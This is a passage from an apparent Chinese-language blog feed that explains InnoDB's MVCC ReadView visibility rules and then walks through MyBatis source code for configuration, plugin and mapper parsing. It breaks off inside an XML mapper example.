                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/16/KtXIEmjRZoNdDTW.png"
                      alt="image.png"
                ></p>
<p>更深刻的认识，我们需要理解源码中的几个值：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/16/ylf3caevqN7Gzgt.png"
                      alt="image.png"
                ></p>
<ul>
<li><p><strong>creator_trx_id</strong></p>
<p>对应源码中的<code>m_creator_trx_id</code>，即<strong>当前事务自己的ID</strong>。</p>
</li>
<li><p><strong>live_txn_list</strong><br>系统当前活跃事务ID的数组，即<strong>所有当前未提交事务的ID</strong>。</p>
</li>
<li><p><strong>up_limit_id</strong><br>对应源码中的<code>m_up_limit_id</code>，即<code>live_txn_list</code>数组中的最小值。</p>
</li>
<li><p><strong>low_limit_id</strong><br>对应源码中的<code>m_low_limit_id</code>，即ReadView生成时刻系统尚未分配的下一个事务ID，也就是<strong>当前系统中最大事务ID值+1</strong>。</p>
<p>注意是当前系统的最大事务的ID，不是列表的最大+1</p>
</li>
</ul>
<p>下面的图可以帮助大家理解这几个值的关系：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/27/ro8ZID15AXb7Quh.jpg"
                      alt="lock19.jpg"
                ></p>
<p>假设我们在当前事务中需要查询一行数据，那么就从这行对应记录链的最新数据中取出<code>DB_TRX_ID</code>的值，假设为<code>TRX_ID</code>。接着就要将<code>TRX_ID</code>与<code>Read View</code>中维护的值进行比较，判断这条数据是否可见，流程大致如下：</p>
<ol>
<li>首先比较<code>TRX_ID &lt; up_limit_id</code>，如果小于，则表明<strong>这条数据的操作事务在本事务开始前已经提交</strong>，对于本事务是可见的。否则进入下一步。</li>
<li>再比较<code>TRX_ID == creator_trx_id</code>，如果等于，则表明<strong>这条数据是本事务自己操作的</strong>，对于自己当然可见。否则进入下一步。</li>
<li>接下来判断 <code>TRX_ID &gt;= low_limit_id</code> ，如果大于，则表明<strong>这条数据的操作事务在当前读视图产生后才开始</strong>，对于本事务不可见。否则进入下一步。</li>
<li>判断<code>TRX_ID</code> 是否在活跃事务数组<code>live_txn_list</code>中，如果不在，则说明这个事务在读视图生成前就已经提交了，那么其修改的数据本事务是可见的。如果在，则代表当前读视图生成时刻，这个事务还没提交，那么其修改的数据对于本事务也是不可见的，进入下一步。</li>
<li>通过<code>DB_ROLL_PTR</code>回滚指针取出后面 一条数据，如果指针为空则说明没有满足条件的数据，返回空。否则回到第一步。</li>
</ol>
<p>流程图如下所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/16/Qd32hnPBpImsA6F.png"
                      alt="image.png"
                ></p>
<h2 id="不可重复读出现的原因"><a href="#不可重复读出现的原因" class="headerlink" title="不可重复读出现的原因"></a>不可重复读出现的原因</h2><p>读已提交与可重复读这两个事务隔离级的不同在于<strong>InnoDB的快照读时Read View生成时机不同</strong>，这也是为什么读已提交事务隔离级别会存在<strong>不可重复读</strong>：</p>
<ul>
<li>在可重复读隔离级别下的某个事务对某条记录的第一次快照读会创建一个快照及Read View，并且此后在调用快照读的时候，还是使用的是同一个Read View，所以只要当前事务在其他事务提交更新之前使用过快照读，那么之后的快照读使用的都是同一个Read View，所以对之后的修改不可见。</li>
<li>而在读已提交级隔离级别下的，事务中<strong>每次快照读都会新生成一个新的Read View</strong>，这就是我们在读已提交隔离级别下的事务中可以看到别的事务提交的更新的原因。、</li>
</ul>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis究极解析</title>
    <url>/2021/05/21/2021/Mybatis%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Mybatis回顾"><a href="#Mybatis回顾" class="headerlink" title="Mybatis回顾"></a>Mybatis回顾</h1><p>MyBatis是一个持久层（ORM）框架，使用简单，学习成本较低。可以执行自己手写的SQL语句，比较灵活。但</p>
<p>是MyBatis的自动化程度不高，移植性也不高，有时从一个数据库迁移到另外一个数据库的时候需要自己修改配</p>
<p>置，所以称只为半自动ORM框架。<a class="link"   href="https://mybatis.org/mybatis-3/zh/configuration.html" >官方文档链接<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="传统JDBC和Mybatis相比的弊病"><a href="#传统JDBC和Mybatis相比的弊病" class="headerlink" title="传统JDBC和Mybatis相比的弊病"></a>传统JDBC和Mybatis相比的弊病</h2><p><strong>传统的JDBC的操作过程大致分为如下几步：</strong></p>
<ol>
<li>通过<code>Class.forName()</code>加载驱动</li>
<li>通过<code>DriverManager.getConnection()</code>创建连接</li>
<li>获取sql执行者<code>prepareStatement</code>并且通过其<code>execute</code>执行sql</li>
<li>通过sql执行者的<code>getResultSet</code>方法获取结果集<code>ResultSet</code>进行解析</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost/liduoan&quot;</span>,</span><br><span class="line">                                                      <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;select * from user&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取驱动—创建连接—执行SQL—获取结果集</p>
<p>上述也称之为四大组件</p>
<p><strong>传统JDBC的问题如下：</strong></p>
<ul>
<li>数据库连接创建、释放频繁造成资源浪费，从而影响系统性能，使用数据库连接池可以解决问题。</li>
<li>sql语句在java代码中硬编码，实际应用中sql的变化可能较大，造成代码维护不方便。</li>
<li>使用<code>preparedStatement</code>向有占位符传递参数存在硬编码问题，因为sql中的where子句的条件不确定，</li>
</ul>
<p>同样是修改不方便。</p>
<ul>
<li>对结果集中解析存在硬编码问题，sql的变化导致解析代码的变化，系统维护不方便。</li>
</ul>
<p><strong>mybatis对传统JDBC的解决方案</strong></p>
<ul>
<li>在mybatis配置文件<code>SqlMapConfig.xml</code>中配置数据连接池，使用连接池管理数据库链接。</li>
<li>将Sql语句配置在<strong>映射配置文件</strong>中与java代码分离。</li>
<li>Mybatis自动将java对象映射至sql语句，通过statement中的<code>parameterType</code>定义输入参数的类型。</li>
<li>Mybatis自动将sql执行结果映射至java对象，通过statement中的<code>resultType</code>定义输出结果的类型。</li>
</ul>
<h2 id="Mybatis使用"><a href="#Mybatis使用" class="headerlink" title="Mybatis使用"></a>Mybatis使用</h2><p><a class="link"   href="https://liduoan.github.io/2021/03/19/Mybatis/" >具体看这篇博客<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="Mybatis源码分析"><a href="#Mybatis源码分析" class="headerlink" title="Mybatis源码分析"></a>Mybatis源码分析</h1><h2 id="解析配置文件"><a href="#解析配置文件" class="headerlink" title="解析配置文件"></a>解析配置文件</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/22/xfLTbFH8zm5IuAC.jpg"
                      alt="Screenshot_90.jpg"
                ></p>
<p>我们知晓使用Mybatis的时候时先从以下两句代码开始的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将mybatis配置文件读取至流中</span></span><br><span class="line"><span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span> Resources.getResourceAsReader(resource);</span><br><span class="line"><span class="comment">// 通过SqlSessionFactoryBuilder的build方法构建SqlSessionFactory工厂</span></span><br><span class="line"><span class="comment">// 这里会解析mybatis配置文件</span></span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(reader);</span><br></pre></td></tr></table></figure>

<p>我们看到先获取一个读取器，然后委托给<code>SqlSessionFactoryBuilder()</code>来执行<code>build</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlSessionFactoryBuilder</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//第一步</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">build</span><span class="params">(Reader reader)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> build(reader, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//第二步</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">build</span><span class="params">(Reader reader, String environment, Properties properties)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建一个XMLConfigBuilder，用于解析mybatis的全局配置文件</span></span><br><span class="line">            <span class="type">XMLConfigBuilder</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLConfigBuilder</span>(reader, environment, properties);</span><br><span class="line">  		    <span class="comment">// 通过XMLConfigBuilder的parse方法进行解析</span></span><br><span class="line">      		<span class="comment">// 解析完成后得到一个Configuration对象，接着调用build方法</span></span><br><span class="line">            <span class="comment">// 这里返回Configuration 再来个build()</span></span><br><span class="line">            <span class="keyword">return</span> build(parser.parse());</span><br><span class="line">        &#125;..</span><br><span class="line">            <span class="keyword">finally</span> &#123;</span><br><span class="line">                ...</span><br><span class="line">                    reader.close();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//第三步  </span></span><br><span class="line">    <span class="comment">// 到这里配置文件已经解析成了Configuration</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">build</span><span class="params">(Configuration config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultSqlSessionFactory</span>(config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要就是解析Mybatis的配置文件到一个Configuration对象中，然后就返回一个SqlSessionFactory对象。</p>
<h3 id="XMLConfigBuilder"><a href="#XMLConfigBuilder" class="headerlink" title="XMLConfigBuilder"></a>XMLConfigBuilder</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">XMLConfigBuilder</span><span class="params">(Reader reader, String environment, Properties props)</span> &#123;</span><br><span class="line">    <span class="comment">//调用自己的方法,new了一个XPathParser  XMLMapperEntityResolver</span></span><br><span class="line">    <span class="built_in">this</span>(<span class="keyword">new</span> <span class="title class_">XPathParser</span>(reader, <span class="literal">true</span>, props, <span class="keyword">new</span> <span class="title class_">XMLMapperEntityResolver</span>()), environment, props);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">XMLConfigBuilder</span><span class="params">(XPathParser parser, String environment, Properties props)</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 调用父类的BaseBuilder的构造方法:给</span></span><br><span class="line"><span class="comment">     * configuration赋值</span></span><br><span class="line"><span class="comment">     * typeAliasRegistry别名注册器赋值</span></span><br><span class="line"><span class="comment">     * TypeHandlerRegistry赋值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">Configuration</span>());</span><br><span class="line">    ErrorContext.instance().resource(<span class="string">&quot;SQL Mapper Configuration&quot;</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把props绑定到configuration的props属性上</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">this</span>.configuration.setVariables(props);</span><br><span class="line">    <span class="built_in">this</span>.parsed = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">this</span>.environment = environment;</span><br><span class="line">    <span class="built_in">this</span>.parser = parser;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Configuration <span class="title function_">parse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 若已经解析过了 就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (parsed) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Each XMLConfigBuilder can only be used once.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置解析标志位</span></span><br><span class="line">    parsed = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解析我们的mybatis-config.xml的</span></span><br><span class="line"><span class="comment">     * 节点</span></span><br><span class="line"><span class="comment">     * &lt;configuration&gt;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;/configuration&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    parseConfiguration(parser.evalNode(<span class="string">&quot;/configuration&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> configuration;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析全局配置文件</span></span><br><span class="line"><span class="comment">// 传入的参数是&lt;configuration&gt;根节点，所有节点都会被XNode对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseConfiguration</span><span class="params">(XNode root)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析&lt;properties&gt;节点</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的variables属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     propertiesElement(root.evalNode(<span class="string">&quot;properties&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">// 解析&lt;settings&gt;节点</span></span><br><span class="line">     <span class="type">Properties</span> <span class="variable">settings</span> <span class="operator">=</span> settingsAsProperties(root.evalNode(<span class="string">&quot;settings&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析VFS基本没有用过该属性：</span></span><br><span class="line"><span class="comment">      * VFS含义是虚拟文件系统，主要是通过程序能够方便读取本地文件系统、FTP文件系统等系统中的文件资源。</span></span><br><span class="line"><span class="comment">      * Mybatis中提供了VFS这个配置，主要是通过该配置可以加载自定义的虚拟文件系统应用程序。</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的vfsImpl属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     loadCustomVfs(settings);</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析 MyBatis 所用日志的具体实现，未指定时将自动查找。</span></span><br><span class="line"><span class="comment">      * SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING |</span></span><br><span class="line"><span class="comment">        STDOUT_LOGGING | NO_LOGGING</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的logImpl属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     loadCustomLogImpl(settings);</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析别名</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的typeAliasRegistry.typeAliases属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     typeAliasesElement(root.evalNode(<span class="string">&quot;typeAliases&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析插件(比如分页插件)</span></span><br><span class="line"><span class="comment">      * mybatis自带的四个Executor、ParameterHandler、ResultSetHandler、StatementHandler </span></span><br><span class="line"><span class="comment">      * 解析到Configuration的interceptorChain.interceptors属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     pluginElement(root.evalNode(<span class="string">&quot;plugins&quot;</span>));</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 解析对象工厂</span></span><br><span class="line">     objectFactoryElement(root.evalNode(<span class="string">&quot;objectFactory&quot;</span>));</span><br><span class="line">     objectWrapperFactoryElement(root.evalNode(<span class="string">&quot;objectWrapperFactory&quot;</span>));</span><br><span class="line">     reflectorFactoryElement(root.evalNode(<span class="string">&quot;reflectorFactory&quot;</span>));</span><br><span class="line">     <span class="comment">// 设置settings和默认值</span></span><br><span class="line">     <span class="comment">// 这个方法里可以看到所有的settings选项和默认值</span></span><br><span class="line">     settingsElement(settings);</span><br><span class="line">       </span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析mybatis环境environments</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的environment属性中</span></span><br><span class="line"><span class="comment">      * 在集成spring情况下由spring-mybatis提供数据源和事务工厂</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     environmentsElement(root.evalNode(<span class="string">&quot;environments&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析数据库厂商databaseIdProvider</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的databaseId属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     databaseIdProviderElement(root.evalNode(<span class="string">&quot;databaseIdProvider&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 解析类型处理器节点typeHandlers</span></span><br><span class="line"><span class="comment">      * 解析到Configuration的typeHandlerRegistry.typeHandlerMap属性中</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     typeHandlerElement(root.evalNode(<span class="string">&quot;typeHandlers&quot;</span>));</span><br><span class="line">       </span><br><span class="line">     <span class="comment">// 解析&lt;mappers&gt;节点，最重要</span></span><br><span class="line">     mapperElement(root.evalNode(<span class="string">&quot;mappers&quot;</span>));</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;Error parsing SQL Mapper Configuration. Cause: &quot;</span> + e, e);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>解析的流程就是按照我们全局配置文件的结构来的，其中最重要的就是解析<code>mappers</code>节点下的sql映射文件</p>
<h3 id="解析插件"><a href="#解析插件" class="headerlink" title="解析插件"></a>解析插件</h3><p>插件的解析在<code>parseConfiguration</code>方法的<code>pluginElement</code>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数传入的时&lt;plugins&gt;标签封装的XNode节点</span></span><br><span class="line"><span class="comment">// pluginElement(root.evalNode(&quot;plugins&quot;));</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pluginElement</span><span class="params">(XNode parent)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">//开始看子节点</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         &lt;plugins&gt;</span></span><br><span class="line"><span class="comment">        	&lt;plugin interceptor=&quot;&quot;&gt;&lt;/plugin&gt;</span></span><br><span class="line"><span class="comment">   		 &lt;/plugins&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">for</span> (XNode child : parent.getChildren()) &#123;	</span><br><span class="line">            <span class="type">String</span> <span class="variable">interceptor</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;interceptor&quot;</span>);</span><br><span class="line">            <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> child.getChildrenAsProperties();</span><br><span class="line">            <span class="comment">// 将interceptor指定的类进行实例化，得到一个Interceptor拦截器对象</span></span><br><span class="line">            <span class="type">Interceptor</span> <span class="variable">interceptorInstance</span> <span class="operator">=</span> (Interceptor) resolveClass(interceptor).getDeclaredConstructor().newInstance();</span><br><span class="line">            interceptorInstance.setProperties(properties);</span><br><span class="line">            <span class="comment">// 将拦截器添加到configuration中</span></span><br><span class="line">            configuration.addInterceptor(interceptorInstance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>插件的解析过程很简单，就是将其解析为拦截器Interceptor对象后存入Configuration中。</p>
<h3 id="解析Mapper映射文件"><a href="#解析Mapper映射文件" class="headerlink" title="解析Mapper映射文件"></a>解析Mapper映射文件</h3><p>映射文件的解析在XMLConfigBuilder类的<code>mapperElement</code>方法里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mapperElement(root.evalNode(&quot;mappers&quot;));</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">mapperElement</span><span class="params">(XNode parent)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 获取我们mappers节点下的一个一个的mapper节点</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">        <span class="keyword">for</span> (XNode child : parent.getChildren()) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 判断我们mapper是不是通过批量注册的</span></span><br><span class="line"><span class="comment">         * &lt;package name=&quot;com.tuling.mapper&quot;&gt;&lt;/package&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;package&quot;</span>.equals(child.getName())) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">mapperPackage</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                configuration.addMappers(mapperPackage);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">               * 判断从classpath下读取我们的mapper</span></span><br><span class="line"><span class="comment">               * &lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">               * 判断是不是从我们的网络资源读取(或者本地磁盘得)</span></span><br><span class="line"><span class="comment">               * &lt;mapper url=&quot;D:/mapper/EmployeeMapper.xml&quot;/&gt;</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">               * 解析这种类型(要求接口和xml在同一个包下)</span></span><br><span class="line"><span class="comment">               * &lt;mapper class=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/mapper&gt;</span></span><br><span class="line"><span class="comment">               *</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">mapperClass</span> <span class="operator">=</span> child.getStringAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">               * 我们得mappers节点只配置了</span></span><br><span class="line"><span class="comment">               * &lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">                <span class="keyword">if</span> (resource != <span class="literal">null</span> &amp;&amp; url == <span class="literal">null</span> &amp;&amp; mapperClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    ErrorContext.instance().resource(resource);</span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 把我们的文件读取出一个流</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 创建读取XmlMapper构建器对象,用于来解析我们的mapper.xml文件</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">XMLMapperBuilder</span> <span class="variable">mapperParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLMapperBuilder</span>(inputStream, configuration, resource, configuration.getSqlFragments());</span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 真正的解析我们的mapper.xml配置文件(说白了就是来解析我们的sql)</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    mapperParser.parse();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resource == <span class="literal">null</span> &amp;&amp; url != <span class="literal">null</span> &amp;&amp; mapperClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    ErrorContext.instance().resource(url);</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getUrlAsStream(url);</span><br><span class="line">                    <span class="type">XMLMapperBuilder</span> <span class="variable">mapperParser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLMapperBuilder</span>(inputStream, configuration, url, configuration.getSqlFragments());</span><br><span class="line">                    mapperParser.parse();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resource == <span class="literal">null</span> &amp;&amp; url == <span class="literal">null</span> &amp;&amp; mapperClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Class&lt;?&gt; mapperInterface = Resources.classForName(mapperClass);</span><br><span class="line">                    configuration.addMapper(mapperInterface);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BuilderException</span>(<span class="string">&quot;A mapper element may only specify a url, resource or class, but not more than one.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从这里我们可以看到Mapper的四种配置方式：</p>
<p>1、<code>&lt;package name=&quot;com.tuling.mapper&quot;&gt;&lt;/package&gt;</code>   批量加载mapper 直接扫描包</p>
<p>2、<code>&lt;mapper resource=&quot;mybatis/mapper/EmployeeMapper.xml&quot;/&gt;</code>  从classpath下读取我们的mapper</p>
<p>3、<code>&lt;mapper url=&quot;D:/mapper/EmployeeMapper.xml&quot;/&gt;</code>        从我们的网络资源读取(或者本地磁盘得)</p>
<p>4、<code>&lt;mapper class=&quot;com.tuling.mapper.DeptMapper&quot;&gt;&lt;/mapper&gt;</code>  解析这种类型(要求接口和xml在同一个包下)</p>
<p>简述下，分别是批量加载，classpath路径下，URL获取，同位置包</p>
<p>我们看到最后是调用<code>XMLMapperBuilder.parse()</code>方法</p>
<p>它是解析的Mapper文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.tuling.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cache</span> &gt;</span><span class="tag">&lt;/<span class="name">cache</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- Mybatis 是如何将 sql 执行结果封装为目标对象并返回的？都有哪些映射形式？--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.tuling.entity.User&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;user_name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;userName&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;create_time&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;DATE&quot;</span> 